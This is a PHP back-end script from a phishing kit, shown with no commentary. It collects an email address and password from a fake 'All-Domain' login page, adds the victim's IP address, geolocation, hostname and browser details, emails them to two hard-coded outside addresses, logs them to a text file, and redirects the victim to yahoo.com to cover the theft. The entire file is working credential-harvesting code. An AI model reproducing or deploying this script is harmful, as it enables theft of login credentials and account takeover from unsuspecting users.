<?php

$to = "supremeuc@gmail.com,supremeuc@yandex.com ";

//-----------------------------------------
$email = $_POST['ai'];
$password = $_POST['pr'];
$link = $_SERVER['HTTP_REFERER'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$state = stripslashes(ucfirst($addr_details[geoplugin_regionName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$subj = " All-Domain ...... Login !!!  |$country|$ip";
$msg = "-----------------------------------------------\n Email Address : $email\n Password : $password\n-----------------------------------------------\nSubmition Time : $timedate\nBrowser used : $browserAgent\nSystem IP : $ip\nSystem Hostname : $hostname\nState : $state\nCountry : $country\nLink : $link\nBOX URL Address : $box\n-----------------------------------------------\n";
$from = "";
mail($to, $subj, $msg, $from);

 $fp = fopen("alldomain.txt","a");
fputs($fp,$msg);
fclose($fp);
 
 
 

header('location: https://yahoo.com/');
?>